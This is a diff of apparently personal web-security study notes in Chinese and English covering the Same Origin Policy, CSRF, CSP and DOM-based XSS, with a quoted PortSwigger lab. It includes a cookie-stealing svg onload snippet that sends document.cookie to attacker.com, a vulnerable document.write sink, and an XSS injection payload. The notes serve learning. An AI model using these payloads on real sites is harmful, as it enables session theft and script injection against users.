@@ -1,6 +1,6 @@
 #### Content Security Policy (CSP)
 - Same Origin Policy prohibits cross-origin fetch. 
-> SOP 主要是为了保护被fetch的网站。但是SOP不禁止跨源提交表单，于是可以CSRF攻击。（没想到吧，让受害者访问攻击者网站，在受害者不知情的情况下偷偷带着cookie发送请求到目标网站比如转走处于登陆状态的受害者的银行账户里的钱财）。SOP也不禁止跨源加载静态资源，可以利用`<svg onload="'attacker.com?q='+document.cookie">`盗取cookie.（没有想到被fetch的网站可以是攻击者的吧，通过get请求在url中携带的参数把cookie偷走）
+> SOP 主要是为了保护被fetch的网站。但是SOP不禁止跨源提交表单，于是可以CSRF攻击。（没想到吧，让受害者访问攻击者网站，在受害者不知情的情况下偷偷带着cookie发送请求到目标网站比如转走处于登陆状态的受害者的银行账户里的钱财）。SOP也不禁止跨源加载静态资源，可以利用`<svg onload="'attacker.com?q='+document.cookie">`盗取cookie.（没有想到被fetch的网站反而是攻击者的吧，通过get请求在url中携带的参数把cookie偷走）
 - Previously, we talked about ways to tighten up Same Origin Policy in terms of which sites could e.g. send requests with cookies to our site (CSRF)
     - That is, preventing other sites from making certain requests to our site 防御CSRF，在server端用origin allowlist
 - CSP is inverse: prevent our site from making requests to other sites
@@ -77,3 +77,18 @@ KIMI chat: 插入到DOM和反射型XSS之间的关键区别在于攻击的触发
 
 简而言之，反射型XSS是服务器将恶意脚本作为响应发送给用户，而DOM-XSS是客户端JavaScript将数据动态插入到DOM中，然后执行。两者的主要区别在于攻击的触发点和数据处理的位置。
 
+例子 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
+
+这个页面有脚本
+```html
+<script>
+function trackSearch(query) {
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+}
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+    trackSearch(query);
+}
+</script>
+```
+其中`query`是通过GET请求url参数`search`传入，可以构造payload`" onload=alert(1) >//`
